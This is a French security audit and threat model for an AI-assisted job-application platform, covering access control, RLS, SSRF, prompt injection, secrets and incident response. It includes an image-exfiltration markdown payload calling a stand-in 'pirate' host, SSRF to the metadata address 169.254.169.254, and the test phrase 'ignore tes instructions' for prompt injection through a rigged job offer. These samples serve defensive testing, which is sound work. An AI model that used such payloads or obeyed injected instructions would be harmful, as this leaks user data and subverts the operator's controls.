# 05 — Sécurité

Audit réalisé au Sprint 1 sur l'ensemble de la plateforme. Chaque mesure renvoie à son code et à sa **preuve** (test ou
vérification manuelle). Ce document est mis à jour à chaque changement qui touche la sécurité.

Légende : ✅ implémenté et vérifié · 🟡 configuration/action de ta part · ⚪ risque accepté en connaissance de cause · ⏳ prévu.

## 1. Ce qu'on protège, et de qui

| Actifs | Pourquoi c'est sensible |
|---|---|
| CV, profil, candidatures (données personnelles) | RGPD ; revente/usurpation d'identité ; vie privée professionnelle |
| Clés IA du propriétaire | Une clé volée = facture payée par le propriétaire |
| Clé `service_role` Supabase | Contourne toute la RLS : accès à toutes les données |
| Comptes des invités | Prise de contrôle = accès à leur CV |

| Adversaire | Capacités supposées |
|---|---|
| Visiteur anonyme | Atteint le site, tente des connexions, des liens |
| Invité malveillant ou compte compromis | Connecté ; appelle l'API Supabase avec sa clé publique ; peut forger des requêtes |
| Auteur d'une offre d'emploi piégée | Contrôle le texte qui est lu par l'IA et affiché |
| Site tiers | Tente CSRF, framing, exfiltration |
| Dépendance malveillante / fuite de clé | Supply chain, dépôt public, logs |

## 2. Matrice des mesures

### Accès et sessions

| ID | Menace | Mesure | Preuve | État |
|---|---|---|---|---|
| A-01 | Inscription par un inconnu | Inscriptions désactivées côté Supabase + **liste blanche obligatoire en production** (le serveur refuse de démarrer sans) | `env.ts` `configProblems` ; `security-units.test.ts` ; démarrage réel → 503 | ✅ code · 🟡 réglage Supabase |
| A-02 | Page ou API accessible sans connexion | Proxy sur toutes les routes ; layout privé ; API 401 ; inventaire des routes | `proxy.ts` ; `security-static.test.ts` ; curl : `/` → 307, API → 401 | ✅ |
| A-03 | Vol de session par script injecté | Cookies `httpOnly`, `sameSite=lax`, `secure` en https | `sessionCookieOptions` ; test | ✅ |
| A-04 | Devinette de mot de passe | 10 essais / 10 min / IP (app) + limites propres de Supabase Auth | `rate-limit.ts` ; navigateur : 11ᵉ essai refusé | ✅ · ⚪ voir R-03 |
| A-05 | Énumération des comptes | Messages identiques (mot de passe incorrect / lien envoyé) | Vérifié en navigateur | ✅ |
| A-06 | Élévation vers admin | `ADMIN_EMAILS` **et** adresse confirmée | `auth.ts` | ✅ |
| A-07 | CSRF | Contrôle d'origine natif des Server Actions ; déconnexion : `Sec-Fetch-Site`/`Origin` | `origin.ts` ; curl : 403 ×3, 303 ×1 | ✅ |
| A-08 | Redirection ouverte, type de lien forgé | Chemin relatif seulement ; types d'e-mail en liste fermée | `auth/confirm/route.ts` | ✅ |

### Données

| ID | Menace | Mesure | Preuve | État |
|---|---|---|---|---|
| D-01 | Lire/modifier les données d'un autre | RLS sur toutes les tables, politiques « ses lignes » | `rls.test.ts` (Postgres en mémoire) : lecture, modification, suppression, création au nom d'autrui refusées | ✅ |
| D-02 | Fabriquer un rapport ou contourner un quota | `reports`, `documents`, `runs` : aucune écriture utilisateur ; écriture par le serveur | `rls.test.ts` | ✅ |
| D-03 | Stocker des volumes énormes via l'API directe | Plafonds de taille et 1000 candidatures max, en base | `db-security.test.ts` ; script 0002 | ✅ · 🟡 à exécuter |
| D-04 | Appeler les fonctions SQL sensibles | `start_run` réservée à `service_role` ; `handle_new_user` retirée aux rôles API | `db-security.test.ts` ; `verify/0002` | ✅ · 🟡 à exécuter |
| D-05 | Données résiduelles après départ | Suppression d'un compte = suppression en cascade de tout | `rls.test.ts` | ✅ |
| D-06 | Perte de données | Sauvegardes Supabase | — | 🟡 voir checklist |
| D-08 | **Exposition par l'API automatique** : `public` est exposé par défaut à qui a la clé publique | Tout dans un **schéma dédié** `jobhunter` (non exposé tant que tu ne l'ajoutes pas), **aucun droit pour `anon`**, droits minimaux pour `authenticated`, fonctions réservées à `service_role` ; clients de l'app fixés sur ce schéma | `db-schema.test.ts`, `db-client.test.ts`, `verify/0003`, `scripts/supabase-exposure-check.sh` | ✅ code · 🟡 exécuter 0003 + « Exposed schemas » |
| D-07 | Interception / lecture du disque | HTTPS (hébergeur), chiffrement au repos (Supabase) | délégué aux fournisseurs | ⚪ |

### Entrées, contenus et sorties

| ID | Menace | Mesure | Preuve | État |
|---|---|---|---|---|
| E-01 | **SSRF** (URL d'offre vers le réseau interne, métadonnées cloud) | Contrôle de l'URL **et de l'adresse IP à la connexion** (anti-DNS rebinding), redirections revalidées, IPv4/IPv6 privées, 6to4, Teredo bloquées, ports limités, taille et délai bornés | `jd/ssrf.ts`, `jd/fetch.ts` ; `ssrf.test.ts` ; `runs.test.ts` (169.254.169.254 refusé) | ✅ |
| E-02 | Entrées géantes | URL ≤ 2000, offre ≤ 100 000, CV ≤ 60 000, fichier ≤ 5 Mo, PDF ≤ 15 pages, champs plafonnés | actions ; contraintes SQL | ✅ |
| E-03 | **Injection de prompt** par une offre ou un CV | L'offre est une *donnée* entre balises ; le modèle n'a **aucun outil** ; la réponse est validée avant enregistrement ; règles « n'invente rien » | `engine/prompts.ts`, `engine/report.ts` ; `runs.test.ts` | ✅ · ⚪ R-01 |
| E-04 | XSS | React échappe ; **aucun HTML brut** (test statique) ; CSP | `security-static.test.ts` ; `security-units.test.ts` | ✅ |
| E-05 | **Exfiltration par image** (`![](https://pirate/?d=…)`) | Images supprimées du rendu + `img-src 'self' data:` | `markdown-config.ts` ; test dédié | ✅ |
| E-06 | Lien `javascript:` | Neutralisé ; liens `noopener noreferrer nofollow` | test dédié | ✅ |
| E-07 | PDF piégé | Taille, nombre de pages, lecture sans écriture disque | `actions/profile.ts` | ✅ · ⚪ R-04 |

### Secrets et configuration

| ID | Menace | Mesure | Preuve | État |
|---|---|---|---|---|
| C-01 | Clé secrète dans le navigateur | Lue seulement dans `env.ts` et `llm/index.ts` ; aucun composant client n'importe de module serveur ; aucune clé en `NEXT_PUBLIC_` | `security-static.test.ts` | ✅ |
| C-02 | Clé dans le dépôt ou l'image | `.env` ignoré ; image sans secret ; analyse du dépôt sans résultat | tests statiques ; recherche de motifs de clés | ✅ |
| C-03 | Démarrage avec une configuration dangereuse | Production : `SITE_URL` https et `ALLOWED_EMAILS` obligatoires | démarrage réel → 503 | ✅ |
| C-04 | Fuite de clé dans un message d'erreur | Erreurs fournisseur nettoyées | `llm.test.ts`, `runs.test.ts` | ✅ |
| C-05 | Clé compromise | Procédure de rotation ([07](07-exploitation.md#rotation-des-clés)) | — | 🟡 |

### Coûts et abus

| ID | Menace | Mesure | Preuve | État |
|---|---|---|---|---|
| K-01 | Dépasser les quotas par requêtes simultanées | `start_run` : contrôle + création dans **une transaction**, verrou par utilisateur | `db-security.test.ts` (logique) | ✅ · 🟡 R-02 |
| K-02 | Choisir le modèle le plus cher | `MAX_TIER` plafonne côté serveur à chaque appel | `env.test.ts` | ✅ |
| K-03 | Facture imprévue | Plafond global 24 h ; page `/admin` ; limites de dépense chez les fournisseurs | — | ✅ · 🟡 limites fournisseurs |

### Navigateur, hébergement, chaîne d'approvisionnement

| ID | Menace | Mesure | Preuve | État |
|---|---|---|---|---|
| H-01 | Framing, MIME sniffing, fuite de référent, API sensibles | CSP stricte, HSTS, `X-Frame-Options`, `nosniff`, `Referrer-Policy`, `Permissions-Policy`, COOP/CORP | curl en production ; navigateur : 0 violation de CSP, formulaires fonctionnels | ✅ |
| H-02 | Évasion du conteneur | Exécution `USER node`, port lié à `127.0.0.1` en compose | `security-static.test.ts` | ✅ |
| H-03 | Écoute réseau | HTTPS imposé par l'hébergeur / reverse proxy | — | 🟡 |
| H-04 | Dépendance vulnérable | `npm audit` : **0 vulnérabilité** (prod et dev) au Sprint 1 ; contrôle mensuel | commande | ✅ · 🟡 routine |

### Vie privée

| ID | Sujet | Mesure | État |
|---|---|---|---|
| P-01 | Le CV part chez le fournisseur IA | Informé aux invités (page Profil) ; OpenRouter : `data_collection=deny` ; vérifier les conditions de chaque fournisseur | ✅ · 🟡 informer |
| P-02 | Conservation du fichier PDF | Non conservé ; seul le texte converti l'est | ✅ |
| P-03 | Droit d'accès et d'effacement | Effacement : suppression du compte dans Supabase (cascade) ; export/suppression libre-service au Sprint 5 | ✅ manuel · ⏳ |
| P-04 | Contenu dans les journaux | Aucun CV ni offre journalisé ; erreurs internes sans données personnelles | ✅ (revue de code) |

## 3. Risques résiduels (acceptés ou à surveiller)

| ID | Risque | Pourquoi on l'accepte / comment on le contient |
|---|---|---|
| R-01 | Une offre piégée peut **fausser le texte ou la note** d'un rapport (le modèle lit du texte non fiable) | Impossible à éliminer totalement. Contenu : aucun outil, aucune action, rendu sans HTML/image ; l'utilisateur relit ; la note n'est qu'une recommandation |
| R-02 | Le verrou de `start_run` n'est pas démontrable sur le Postgres en mémoire des tests (exécution séquentielle) | Logique entièrement testée ; **test de concurrence réel prévu au Sprint 2 (S2-08)** |
| R-03 | Limiteur de connexion en mémoire, basé sur `X-Forwarded-For` | Une seule instance ; l'hébergeur doit poser cet en-tête ; Supabase limite aussi. Limiteur partagé au Sprint 5 |
| R-04 | Un PDF piégé peut consommer du CPU pendant sa lecture | Taille et pages bornées ; usage par des proches ; isolation en worker au besoin |
| R-05 | CSP avec `unsafe-inline` pour les scripts | Imposé par Next sans *nonce* ; compensé par l'absence de HTML brut et d'image distante ; nonce au Sprint 5 |
| R-06 | Pas de double authentification | Accès sur invitation ; MFA admin au Sprint 5 |
| R-07 | Dépendance aux fournisseurs (Supabase, IA, hébergeur) | Repli entre deux fournisseurs IA ; sauvegardes ; données exportables |
| R-09 | **Dépôt public** : code, scripts SQL et cette documentation de sécurité sont lisibles par tous | La sécurité ne repose pas sur le secret du code ; aucun secret dans le dépôt (test statique) ; détection de secrets GitHub à activer ; clé commitée par erreur = **révoquer**, pas seulement supprimer |
| R-08 | Le moteur copié (`engine/`) hérite de ses propres choix | Mise à jour contrôlée par `npm run sync-engine`, revue du diff |

## 4. Ce qui n'a PAS pu être vérifié au Sprint 1

- Le parcours **réel** Supabase (e-mails d'invitation, lien magique, cookies émis par la vraie Auth).
- Les appels réels aux fournisseurs IA (les tests utilisent des réponses simulées) et la lecture de vraies pages d'offres.
- Le build Docker lui-même (pas de démon Docker dans l'environnement) : les étapes ont été reproduites à la main.
- Le comportement du verrou SQL en concurrence réelle (R-02).
- L'exposition réelle de l'API de ton projet (le script `supabase-exposure-check.sh` est à lancer contre ta base).

Ces points sont des tâches du Sprint 2 (S2-04, S2-06, S2-08, S2-10).

## Checklist de mise en ligne

À cocher **avant d'inviter qui que ce soit** (Sprint 2, S2-09).

**Supabase**
- [ ] Projet en région UE
- [ ] `0001`, `0002` puis `0003` exécutés ; `verify/0003` : toutes les lignes `ok = true`
- [ ] **Exposed schemas** (Project Settings → API) : `jobhunter` ajouté, `public` retiré s'il ne sert à rien d'autre
- [ ] `sh platform/scripts/supabase-exposure-check.sh <URL> <clé publishable>` : tout ✓ (aucune table dans `public`, `jobhunter` fermé aux anonymes)
- [ ] « Allow new users to sign up » **désactivé**
- [ ] *Site URL* et *Redirect URLs* = l'URL https de l'app (rien d'autre)
- [ ] Les 3 modèles d'e-mail (invitation, lien magique, récupération) pointent vers `/auth/confirm`
- [ ] SMTP dédié configuré
- [ ] Sauvegardes activées ; date de la dernière sauvegarde notée
- [ ] La clé `service_role` n'est dans aucun fichier, message ni capture d'écran
- [ ] Dépôt public : *Secret scanning* et *Push protection* de GitHub activés ; aucune clé jamais commitée (sinon : la révoquer)

**Application / hébergeur**
- [ ] `SITE_URL` en https ; `ALLOWED_EMAILS` = exactement les personnes invitées ; `ADMIN_EMAILS` = toi
- [ ] Clés IA saisies **uniquement** dans l'interface de l'hébergeur ; `.env` jamais commité
- [ ] Une seule instance, toujours allumée ; sonde `/api/health`
- [ ] HTTPS valide ; l'en-tête `X-Forwarded-For` est posé par le proxy
- [ ] `MAX_TIER=standard`, `DAILY_RUN_LIMIT` et `GLOBAL_DAILY_RUN_LIMIT` adaptés

**Fournisseurs IA**
- [ ] Limite de dépense mensuelle + alerte chez Anthropic et chez OpenRouter
- [ ] OpenRouter : réglage de confidentialité vérifié ; conditions lues

**Recette avec 2 comptes de test**
- [ ] Le compte B ne voit ni les candidatures ni le CV du compte A
- [ ] Une adresse hors `ALLOWED_EMAILS` est refusée même avec un compte valide
- [ ] Le dépassement de quota affiche un message clair ; 12 clics rapides ne dépassent pas la limite
- [ ] `/admin` refusé au compte B
- [ ] Une offre contenant « ignore tes instructions » ne change pas le comportement (note + texte seulement)
- [ ] Une URL `http://169.254.169.254/` est refusée

## Réponse à incident (résumé ; détail dans [07](07-exploitation.md#incidents))

1. **Clé IA exposée** : la révoquer immédiatement dans la console du fournisseur, en créer une, la saisir chez l'hébergeur, redéployer.
2. **Clé `service_role` exposée** : la régénérer dans Supabase, mettre à jour l'hébergeur, redéployer, regarder les journaux Supabase.
3. **Compte invité compromis** : le supprimer ou le bloquer dans Supabase, retirer l'adresse de `ALLOWED_EMAILS`.
4. **Fuite de données suspectée** : couper le service, conserver les journaux, prévenir les personnes concernées.
